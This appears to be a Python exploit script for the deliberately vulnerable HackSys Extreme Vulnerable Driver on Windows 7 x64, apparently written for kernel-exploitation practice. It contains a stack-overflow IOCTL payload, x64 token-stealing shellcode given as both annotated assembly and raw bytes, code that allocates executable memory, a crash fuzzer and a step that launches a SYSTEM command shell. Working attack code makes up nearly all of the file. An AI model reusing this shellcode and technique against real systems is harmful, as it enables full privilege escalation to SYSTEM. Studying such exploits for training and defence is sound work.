from ctypes import *
import ctypes
import os
import struct
import subprocess
import sys
 
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

def hexdump(ptr, num):
        """
        Hexdump memory region - DEBUG

        0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
        0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
        0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
        0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
        0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
        0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
        0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
        0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
        """
        
        s = ''
        n = 0
        lines = []
        data = list((num * ctypes.c_byte).from_address(ptr))

        if len(data) == 0:
            return '<empty>'

        for i in range(0, num, 16):
            line = ''
            line += '%04x | ' % (i)
            n += 16

            for j in range(n-16, n):
                if j >= len(data): break
                line += '%02x ' % abs(data[j])

            line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

            for j in range(n-16, n):
                if j >= len(data): break
                c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
                line += '%c' % c

            lines.append(line)
        return '\n'.join(lines)

def ctl_code(code):
	"""
	Recreate CTL_CODE macro to generate driver IOCTL
	"""
	
	FILE_DEVICE_UNKNOWN = 0x22
	FILE_ANY_ACCESS = 0
	METHOD_NEITHER = 3

	return (
            (FILE_DEVICE_UNKNOWN << 16) |
            (FILE_ANY_ACCESS << 14) | 
            (code << 2) | 
            METHOD_NEITHER
        )

def _HANDLE_driver_connection():
	""" 
	Create handle to driver 
	"""
	
	handle = kernel32.CreateFileA(
	    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
	    0xC0000000, 	 		     # dwDesiredAccess
	    0, 					     # dwShareMode
	    None, 				     # lpSecurityAttributes
	    0x3, 				     # dwCreationDisposition
	    0, 					     # dwFlagsAndAttributes
	    None 				     # hTemplateFile
	)

	return handle

def _ret_shellcode_buffer(shellcode):
        """
        Payload memory allocation in user-land
	"""
        MEM_COMMIT_MEM_RESERVE = 0x3000
	PAGE_EXECUTE_READWRITE = 0x40
	
	ptr = kernel32.VirtualAlloc(
	 	c_int(0), 		        # lpAddress
	 	c_int(len(shellcode)), 	        # dwSize
	 	c_int(MEM_COMMIT_MEM_RESERVE),	# flAllocationType
	 	c_int(PAGE_EXECUTE_READWRITE)   # flProtect
	)
	
	shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

	kernel32.RtlMoveMemory(
		c_int(ptr),
		shellcode_ptr,
		c_int(len(shellcode))
	)
        
	return ptr

def _send_payload(handle, payload, code):
	"""
	Interacting with the driver
	"""
	
	IO_CTL = kernel32.DeviceIoControl(
	    handle, 			# hDevice
	    ctl_code(code), 		# dwIoControlCode
	    payload,      		# lpInBuffer
	    len(payload), 		# nInBufferSize
	    None, 			# lpOutBuffer
	    0, 				# nOutBufferSize
	    byref(c_ulong()), 	        # lpBytesReturned
	    None 			# lpOverlapped
	)
	
	return IO_CTL

def ret_shellcode_x64():
        """
        PLEASE READ THE FOLLOW TUTORIALS FIRST!!!
        
                1 - https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/
                2 - https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
	------------------------------------------------------------------------
	Generate Shellcode:
	
                1 - https://defuse.ca/online-x86-assembler.htm#disassembly
	------------------------------------------------------------------------
	Windows Assembly x86/x64- REPL:
	
                1 - https://github.com/zerosum0x0/WinREPL
	------------------------------------------------------------------------
	; save registers
	push rax
	push rbx
	push rcx

        ; uf nt!PsGetCurrentProcess
	mov rax, qword ptr [gs:0x188] ; Current Thread
	mov rax, qword ptr [rax + 0x70] ; Current Process Address | 1: kd> !process fffffa800700f060 0
        ;                                                         | .... python.exe
        
        ; save rax to rbx
	mov rbx, rax 

	search_system_PID:

	mov rbx, qword ptr [rbx + 0x188] ; Pointer to  ActiveProcessLinks.Flink[0] -> Get List of processes | 1: kd> dps fffffa800700f060+0x188
        ;                                                                                                   | fffffa80`0700f1e8  fffffa80`08fbfcb8
        
	sub rbx, 0x188 ; Get Previous Process Address -> fffffa80`08fbfcb8-0x188 | 1: kd> !process fffffa80`08fbfb30 0 
        ;                                                                        | .... conhost.exe   

	mov rcx, qword ptr [rbx+ 0x180] ; Get Previous Process Address PID -> [UniqueProcessID] | 1: kd> dps fffffa8008fbfb30+180h
        ;                                                                                       | fffffa80`08fbfcb0  00000000`00000cc0 = PID [3264] 

	cmp rcx, 0x04 ; Loop comparing if current value is respectively for SYSTEM PID [0x04]
	jnz search_system_PID

        ; If found SYSTEM PID [0x40], copy token for current process
	mov rcx, qword ptr [rbx + 0x208] ; Token struct -> dt nt!_EPROCESS <PROC ADDRESS> | 1: kd> dt nt!_EPROCESS  fffffa8008fbfb30 
        ;                                                                                   +0x208 Token            : _EX_FAST_REF

	and cl, 0xf0 ; Flip last bit in order to get SYSTEM token address value
	mov qword ptr [rax + 0x208], rcx ; Move SYSTEM token value to current Process (python.exe)

        ; restore registers (required for proper stack return)
	pop rcx
	pop rbx
	pop rax
	
        add rsp, 0x66 ; stack alignment -> IMPORTANT: substract previous ESP address for the one after crashes.
        xor rax, rax  ; (i.e. NT_SUCCESS)
	ret

	# CUSTOM win7 x64 7601.17514.amd64fre.win7sp1_rtm.101119-1850 kshellcode

        IMPORTANT FOR DEBUGGING:

                When "\xcc"(First byte of shellcode) gets executed from windbg,
                stop the usage of [VirtualKD]. Reboot VM and re-run the exploit
                The shellcode should be executed as normal without crash entire VM.

	------------------------------------------------------------------------

        Current Thread flow (nt.dll methods):

                nt!_KPCR(0x00)
                
                | +0x180 Prcb             : _KPRCB
                v
                   
                nt!_KPRCB(0x180)
 
                | +0x008 CurrentThread    : Ptr64 _KTHREAD
                v

                nt!_KTHREAD(0x180 + 0x08)

                | +0x050 ApcState         : _KAPC_STATE
                v
                   
                nt!_KAPC_STATE(0x180 + 0x08 + 0x50)

                | +0x020 Process          : Ptr64 _KPROCESS
                v

                nt!_KPROCESS(0x180 + 0x08 + 0x50 + 0x20)
                
	------------------------------------------------------------------------
        
        Usefull commands:

                Identify KTHREAD + ActiveProcessLinks offset (easy):
                        1 - u nt!PsGetCurrentProcess
                                |
                                v
                                nt!PsGetCurrentProcess:
                                fffff800`02aeebb0 65488b042588010000 mov     rax,qword ptr gs:[188h]
                                fffff800`02aeebb9 488b4070           mov     rax,qword ptr [rax+70h]
                                fffff800`02aeebbd c3                 ret
                #TODO
                        .....
        """

	shellcode = bytearray(
                "\x50\x53\x51\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC3\x48\x8B\x9B\x88\x01\x00\x00\x48\x81\xEB\x88\x01\x00\x00\x48\x8B\x8B\x80\x01\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x08\x02\x00\x00\x80\xE1\xF0\x48\x89\x88\x08\x02\x00\x00\x59\x5B\x58\x48\x83\xC4\x28\x48\x31\xc0\xc3"
        )
	return shellcode

def _start_fuzzer(grooms, code):
        """
        It applies split fuzzing technique until target API driver crashes.
        default: grooms=0 (send all junk)

        Check crash offset:
            https://wiremask.eu/tools/buffer-overflow-pattern-generator/

            NOTE: In x64 bits systems, you need to applies follow calculation
            for the returned result:

            OFFSET - 4 = CORRECT OVERFLOW OFFSET
            
            ex:
                [wiremask.eu] ->  returned [2076] as results -> [2076 - 4] -> [2072].

                junk =  "A" * 2072
                junk += "B" * 8

                EIP after crash -> [4242424242424242]
        """

        # 3000 bytes
        junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

        print("[!] JUNK lenght: [%s]" % str(len(junk)))
        print("[!] Starting to fuzz API...\n")
        
        grooms = 8
        new_grooms = grooms

        while True:
            
            payload = junk[:grooms+new_grooms] # [grooms=2] Aa -> Aa0A -> Aa0Aa1 -> ...
            
            # driver file handler 
            hFile = _HANDLE_driver_connection()

            # send junk
            _send_payload(
                    hFile,
                    payload,
                    code
            )
            
            print("[*] sent [%s] bytes!..." % str(len(payload)+8))
            
            new_grooms = new_grooms + grooms

            if new_grooms == len(junk):
                break
	
def _exploit(code):
        """
        Execute exploit in order to get nt-authority/SYSTEM shell
        """
        
	# shellcode virtual_allocation()
        shellcode = ret_shellcode_x64()
	shellcode_ptr = _ret_shellcode_buffer(shellcode)
	print("[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
	print(hexdump(shellcode_ptr, 32))

        # unstrutable user-input
	payload = "\x41" * 2072
	payload += struct.pack("<Q", shellcode_ptr) # (RIP overflow)

	# driver file handler 
	hFile = _HANDLE_driver_connection()		  
	print("\n[+] Driver connection initilized!\n")

        raw_input("[*] Press any key to send payload...")
	# send custom payload -> junk + <shellcode_ptr> 
	_send_payload(
		hFile,
		payload,
		code
	)
	
	print("[+] Exploit Payload Sent!")
	print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
	
	os.system("start cmd.exe") # get SYSTEM shell
    
if __name__ == "__main__":

        # IOCTL to trigger the stack overflow vulnerability
        #
	# copied from:
	#   * - https://github.com/HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
	code = 0x800 # HEVD_IOCTL_STACK_OVERFLOW(0x800)

        fuzzing = False  # change here
        if fuzzing: # fuzz until crashes
            
            grooms = 8  # only for split based fuzzing attacks
            wordlist = "" # junk wordlist for fuzzing API's (TODO)

            # fuzz
            _start_fuzzer(
                grooms,
                code
            ) 

        else:
            _exploit(code)
